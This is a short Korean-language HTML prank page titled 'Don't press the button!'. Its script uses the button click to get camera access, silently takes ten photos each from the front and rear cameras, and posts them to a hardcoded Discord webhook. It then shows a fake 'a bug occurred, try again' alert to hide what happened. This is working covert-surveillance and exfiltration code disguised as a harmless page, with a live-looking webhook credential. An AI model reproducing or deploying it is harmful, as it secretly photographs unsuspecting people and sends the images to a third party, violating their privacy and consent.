<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>버튼을 누르지마세요!</title>
  <style>
    body { text-align: center; font-family: Arial; margin-top: 30px; }
    video, canvas { width: 300px; border-radius: 12px; margin-top: 10px; }
    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>

<h2>버튼을 누르지마세요!</h2>
<button id="startBtn">버튼</button>

<br>
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1545714557421486112/UW1u7ukGMz8PCsG7YgsoOY8W8NoXq2ZPSIjkRfqcp0obV5sSWF-E_UvpyO1ONyc1G5Aa";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const startBtn = document.getElementById("startBtn");

const PHOTOS_PER_CAMERA = 10;
const INTERVAL = 150;

async function sendToDiscord(blob, name, label) {
  const form = new FormData();
  form.append("file", blob, name);
  form.append("content", label);

  await fetch(WEBHOOK_URL, {
    method: "POST",
    body: form
  });
}

async function captureSequence(facingMode, label) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode }
  });

  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 1000));

  for (let i = 1; i <= PHOTOS_PER_CAMERA; i++) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    await new Promise(resolve => {
      canvas.toBlob(async blob => {
        await sendToDiscord(
          blob,
          `${label}_${i}.png`,
          `📸 ${label} ${i}번째`
        );
        resolve();
      }, "image/png");
    });

    await new Promise(r => setTimeout(r, INTERVAL));
  }

  stream.getTracks().forEach(t => t.stop());
}

startBtn.addEventListener("click", async () => {
  try {
    await captureSequence("user", "ㅋㅋ");
    await captureSequence("environment", "ㅎㅎ");
    alert("버그걸렸습니다! 다시해주세요");
  } catch (e) {
    alert("버그걸렸습니다! 다시해주세요!");
  }
});
</script>

</body>
</html>
